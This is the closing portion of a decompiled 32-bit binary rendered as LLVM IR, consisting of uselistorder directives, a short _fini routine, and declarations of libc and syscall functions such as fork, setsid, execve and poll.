  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 12, 29, 56, 57, 58, 59, 69, 70, 71, 72, 10, 73, 2, 68, 30, 60, 11, 61, 62, 63, 13, 74, 75, 76, 77, 78, 79, 14, 67, 65, 66, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 7, 5, 6, 8, 3, 64, 0, 42, 43, 44, 45, 9, 16, 46, 47, 48, 1, 49, 50, 51, 52, 53, 15, 4, 54, 55 }
  uselistorder i32 ptrtoint (i32* @global_var_805b000.538 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, {}
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_8057696, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_80576ab = load i32, i32* @ebx, align 4
  %v1_80576ac = call i32 @__get_pc_thunk_bx(i32 %v0_80576ab)
  store i32 %v1_80576ac, i32* @eax, align 4
  %v0_80576b7 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_80576b7

; uselistorder directives
  uselistorder i32* @eax, { 17, 2, 33, 119, 4, 120, 121, 3, 122, 0, 32, 1, 118, 123, 34, 124, 67, 68, 70, 18, 69, 125, 127, 126, 8, 9, 97, 98, 186, 128, 40, 133, 41, 134, 135, 136, 43, 137, 5, 45, 46, 153, 154, 47, 155, 48, 156, 157, 49, 50, 51, 158, 159, 160, 161, 52, 162, 163, 164, 165, 53, 146, 174, 188, 189, 63, 190, 191, 193, 64, 194, 10, 192, 14, 16, 187, 116, 19, 71, 72, 167, 73, 175, 177, 178, 176, 74, 75, 179, 180, 182, 183, 181, 166, 54, 11, 12, 142, 143, 144, 42, 145, 138, 139, 140, 141, 76, 77, 147, 148, 78, 79, 99, 101, 100, 102, 103, 105, 66, 104, 149, 150, 44, 151, 152, 129, 35, 36, 130, 37, 131, 38, 39, 132, 20, 80, 81, 82, 83, 84, 21, 85, 55, 57, 56, 59, 58, 60, 86, 61, 62, 87, 88, 89, 90, 22, 91, 23, 92, 24, 25, 93, 26, 94, 27, 95, 96, 28, 7, 6, 106, 107, 29, 108, 109, 110, 111, 112, 113, 114, 30, 115, 31, 65, 117, 168, 169, 170, 171, 172, 173, 195, 184, 185, 13, 15 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1307, 15, 16, 17, 69, 902, 1308, 1311, 1309, 1310, 903, 1128, 1129, 18, 71, 1314, 1322, 1316, 1317, 19, 59, 1318, 1319, 1320, 904, 1321, 70, 143, 144, 145, 1312, 1313, 153, 1323, 1324, 1326, 1327, 1325, 1328, 300, 1329, 1330, 1331, 1332, 1333, 1334, 154, 155, 905, 381, 382, 123, 1021, 906, 1022, 1023, 74, 75, 1024, 1025, 1026, 872, 1027, 73, 907, 72, 908, 156, 0, 1, 909, 157, 158, 910, 911, 912, 159, 913, 1337, 914, 1335, 285, 1336, 383, 384, 160, 2, 3, 915, 1338, 1339, 1340, 1341, 1342, 385, 916, 917, 161, 1343, 20, 76, 1271, 126, 127, 918, 1344, 77, 919, 21, 162, 1130, 386, 1345, 1346, 1347, 1131, 1132, 14, 301, 164, 163, 1133, 1134, 302, 1135, 1136, 165, 166, 920, 1348, 1349, 921, 1137, 922, 1138, 1139, 1140, 1141, 1350, 167, 923, 168, 387, 1353, 1354, 1355, 1356, 134, 22, 1357, 78, 1370, 1371, 1384, 1385, 1386, 1387, 1393, 1394, 1395, 1396, 1388, 1389, 1390, 1391, 1392, 79, 80, 924, 1397, 1398, 81, 82, 83, 925, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 169, 1478, 1479, 170, 1480, 1481, 1482, 84, 135, 303, 146, 926, 136, 1142, 171, 1143, 23, 137, 128, 1144, 272, 172, 1145, 129, 1146, 1358, 1359, 1366, 304, 1367, 927, 1147, 388, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 173, 928, 1156, 1157, 1158, 1159, 174, 1160, 929, 175, 266, 389, 176, 930, 931, 932, 305, 1161, 1459, 1460, 1461, 306, 295, 296, 1462, 1463, 1464, 1465, 1466, 1467, 933, 307, 1162, 177, 934, 1163, 178, 308, 309, 1164, 1165, 935, 1166, 1167, 1168, 1169, 119, 1553, 1554, 1555, 1556, 130, 273, 138, 1170, 274, 936, 937, 938, 1171, 179, 1172, 1490, 1505, 1506, 1507, 390, 1508, 1284, 1509, 1036, 1558, 1559, 1560, 1561, 1562, 1028, 1563, 1510, 1511, 1564, 180, 1565, 1576, 1577, 24, 152, 939, 25, 940, 941, 1587, 1591, 275, 1592, 181, 841, 391, 392, 4, 1566, 1567, 1568, 182, 183, 989, 871, 184, 942, 1251, 310, 311, 185, 1252, 1253, 186, 187, 1255, 1254, 1256, 1257, 393, 842, 1258, 1260, 1259, 1261, 1569, 1570, 188, 943, 1575, 1080, 1081, 1082, 1083, 944, 945, 1084, 370, 946, 312, 189, 190, 191, 394, 395, 131, 396, 1263, 1262, 397, 1270, 192, 193, 947, 1029, 948, 1030, 194, 949, 195, 950, 1298, 85, 1299, 1300, 1301, 5, 951, 1439, 398, 1031, 1032, 1033, 1034, 952, 196, 1578, 843, 197, 313, 1580, 1583, 1582, 1514, 1515, 1516, 1517, 1518, 314, 1519, 1520, 1521, 399, 1512, 400, 1513, 401, 953, 1037, 147, 1038, 315, 954, 1039, 955, 956, 402, 844, 957, 403, 845, 198, 958, 1522, 1523, 199, 200, 404, 846, 149, 1524, 1525, 1526, 201, 202, 405, 847, 148, 1527, 276, 1528, 132, 1529, 1530, 1532, 959, 1531, 6, 1035, 7, 1581, 1264, 1265, 1266, 1267, 1269, 1268, 8, 316, 1491, 1492, 1493, 1417, 960, 317, 1418, 961, 1419, 1420, 1421, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1483, 1468, 203, 204, 962, 963, 318, 1588, 1590, 26, 1315, 205, 206, 1173, 1174, 150, 1175, 207, 964, 1176, 277, 139, 1177, 86, 1422, 61, 9, 965, 319, 320, 208, 1178, 1179, 1180, 209, 1368, 87, 966, 1360, 967, 1365, 1364, 278, 968, 969, 1361, 1363, 1362, 279, 970, 1040, 1369, 1041, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 210, 971, 1190, 321, 1191, 1192, 1193, 1194, 1195, 27, 28, 972, 297, 298, 1196, 1197, 1198, 1199, 29, 1200, 1201, 1202, 30, 973, 1203, 31, 32, 211, 974, 1204, 1205, 1206, 1209, 1207, 1208, 33, 62, 88, 1210, 1211, 1212, 1213, 371, 1214, 1215, 212, 1216, 213, 1217, 975, 280, 1218, 214, 1219, 976, 1220, 1221, 1223, 1224, 1225, 1226, 1227, 1228, 215, 977, 978, 216, 1229, 1230, 979, 1231, 1232, 1233, 1234, 1235, 980, 1236, 1237, 322, 981, 323, 1238, 1239, 1240, 1241, 1242, 1243, 34, 89, 90, 91, 982, 1244, 217, 983, 1245, 848, 1246, 1247, 218, 984, 133, 60, 120, 1222, 281, 1571, 1572, 282, 1574, 1573, 92, 406, 985, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 324, 1382, 986, 987, 1383, 325, 1248, 219, 1351, 988, 1352, 1557, 220, 1302, 1579, 1042, 1469, 1489, 1043, 1496, 1584, 151, 326, 1551, 1589, 1497, 1552, 1044, 1498, 221, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1447, 1499, 1500, 1054, 1585, 1586, 873, 267, 1055, 268, 1056, 1058, 1057, 1059, 1060, 874, 410, 411, 330, 331, 329, 1061, 35, 222, 223, 327, 407, 224, 875, 1062, 225, 328, 1063, 1064, 93, 140, 409, 228, 226, 227, 408, 1065, 1066, 1067, 1068, 1070, 286, 1069, 876, 1071, 1072, 229, 230, 231, 332, 232, 349, 95, 1074, 412, 1073, 414, 415, 94, 413, 416, 417, 233, 1075, 333, 1076, 372, 1077, 1078, 1079, 334, 141, 430, 849, 878, 437, 438, 335, 1086, 287, 288, 877, 1085, 879, 439, 440, 427, 1087, 1089, 428, 429, 1088, 100, 1090, 880, 441, 442, 424, 850, 1091, 1093, 425, 851, 426, 852, 1092, 99, 1094, 881, 443, 444, 431, 1095, 882, 445, 446, 421, 853, 1096, 1098, 422, 854, 423, 855, 1097, 98, 1099, 883, 447, 448, 418, 856, 1100, 1102, 419, 420, 857, 1101, 97, 1103, 373, 1104, 1105, 1106, 1107, 884, 449, 450, 432, 858, 1108, 1110, 433, 859, 434, 860, 1109, 96, 1111, 124, 125, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 885, 451, 452, 886, 453, 454, 435, 861, 1121, 887, 455, 456, 436, 862, 1122, 1123, 888, 457, 458, 1124, 1125, 889, 459, 460, 890, 461, 462, 891, 463, 464, 892, 486, 487, 269, 36, 465, 1126, 1127, 101, 63, 102, 37, 1249, 1250, 38, 64, 103, 1272, 350, 1273, 39, 351, 1274, 270, 1275, 893, 466, 467, 894, 468, 469, 895, 470, 471, 896, 472, 473, 897, 474, 475, 271, 898, 476, 477, 1276, 374, 1277, 1278, 1279, 1280, 336, 1281, 863, 1282, 1283, 142, 1285, 1286, 294, 292, 40, 293, 1287, 375, 1288, 1289, 1290, 1291, 10, 1292, 337, 1293, 234, 291, 289, 41, 290, 1294, 1295, 1296, 1297, 299, 479, 235, 478, 864, 865, 236, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 866, 1014, 1015, 867, 355, 1016, 352, 353, 354, 1017, 1018, 868, 481, 1019, 1303, 1304, 42, 106, 1305, 43, 44, 480, 1306, 104, 65, 105, 338, 869, 11, 237, 238, 239, 1431, 482, 1432, 1433, 1434, 339, 1435, 111, 1436, 1437, 1438, 66, 107, 108, 109, 110, 1440, 240, 241, 242, 243, 1441, 1443, 1444, 1445, 244, 1446, 245, 246, 247, 356, 1442, 376, 483, 484, 340, 357, 341, 12, 342, 899, 485, 1448, 248, 249, 250, 251, 343, 1449, 252, 253, 358, 1450, 1451, 254, 45, 46, 1456, 112, 67, 1457, 359, 1452, 1453, 344, 255, 1454, 1455, 377, 256, 257, 258, 360, 870, 1458, 1470, 1471, 1472, 900, 361, 259, 260, 363, 1473, 261, 362, 1474, 113, 47, 68, 48, 1475, 345, 114, 115, 488, 122, 1477, 346, 1476, 490, 491, 116, 489, 492, 493, 1484, 1485, 378, 1486, 1487, 49, 1488, 50, 379, 117, 901, 1494, 262, 263, 494, 1495, 264, 347, 1501, 1502, 1503, 1504, 348, 51, 1533, 1534, 1535, 495, 496, 1545, 52, 53, 121, 54, 366, 367, 1536, 1537, 1538, 1539, 283, 364, 365, 368, 1540, 1541, 1542, 1543, 55, 56, 118, 1544, 380, 57, 58, 1546, 1547, 369, 13, 1548, 1549, 1550, 265, 1020, 284, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600 }
  uselistorder i32* @ebx, { 75, 165, 166, 326, 328, 331, 332, 333, 334, 335, 329, 327, 330, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 356, 357, 0, 358, 359, 360, 361, 362, 363, 364, 365, 366, 289, 290, 167, 168, 169, 367, 3, 368, 369, 370, 4, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 170, 171, 172, 173, 382, 383, 727, 728, 6, 391, 389, 390, 392, 395, 393, 394, 396, 397, 398, 5, 427, 399, 1, 442, 443, 444, 445, 446, 447, 7, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 400, 401, 402, 403, 8, 412, 9, 413, 414, 174, 175, 176, 177, 10, 178, 179, 180, 11, 181, 12, 182, 183, 184, 185, 13, 186, 187, 188, 189, 190, 191, 192, 791, 792, 14, 793, 794, 797, 798, 193, 194, 715, 716, 717, 729, 15, 730, 731, 305, 306, 732, 733, 102, 103, 104, 799, 800, 801, 802, 803, 804, 805, 88, 806, 734, 735, 736, 737, 738, 807, 808, 809, 33, 34, 822, 823, 824, 842, 843, 844, 845, 30, 16, 28, 825, 836, 840, 841, 810, 270, 271, 272, 273, 274, 275, 276, 277, 811, 812, 813, 814, 821, 153, 154, 278, 279, 280, 281, 282, 283, 284, 288, 89, 90, 91, 92, 93, 94, 314, 315, 17, 2, 316, 473, 474, 96, 317, 318, 319, 95, 97, 475, 476, 477, 832, 833, 98, 99, 100, 101, 739, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 18, 754, 755, 740, 741, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 19, 116, 117, 118, 119, 120, 121, 122, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 31, 767, 768, 769, 770, 771, 20, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 830, 831, 285, 286, 287, 462, 463, 464, 465, 466, 467, 21, 468, 469, 470, 696, 697, 698, 699, 700, 846, 847, 848, 849, 850, 851, 852, 856, 857, 694, 695, 195, 196, 707, 708, 197, 198, 199, 200, 201, 202, 203, 204, 415, 416, 417, 418, 419, 420, 421, 422, 404, 407, 408, 409, 410, 411, 405, 406, 123, 124, 125, 126, 423, 424, 425, 426, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 241, 242, 22, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 23, 256, 257, 258, 259, 260, 71, 72, 73, 74, 236, 238, 237, 239, 240, 815, 24, 816, 817, 818, 819, 32, 25, 29, 820, 858, 859, 860, 861, 862, 428, 429, 430, 431, 432, 433, 26, 434, 27, 435, 436, 437, 438, 439, 440, 441, 261, 262, 263, 264, 265, 266, 384, 385, 386, 387, 388, 795, 796, 320, 321, 828, 829, 127, 128, 701, 702, 713, 714, 129, 130, 131, 718, 719, 834, 835, 786, 787, 788, 853, 854, 855, 720, 721, 789, 790, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 689, 690, 722, 723, 724, 725, 726, 142, 143, 144, 826, 827, 837, 838, 839, 145, 146, 147, 148, 149, 150, 151, 152, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 267, 268, 269, 301, 302, 303, 304, 307, 308, 309, 310, 311, 312, 313, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 322, 323, 324, 325, 471, 472, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 691, 692, 693, 703, 704, 705, 706, 709, 710, 711, 712, 782, 783, 784, 785 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
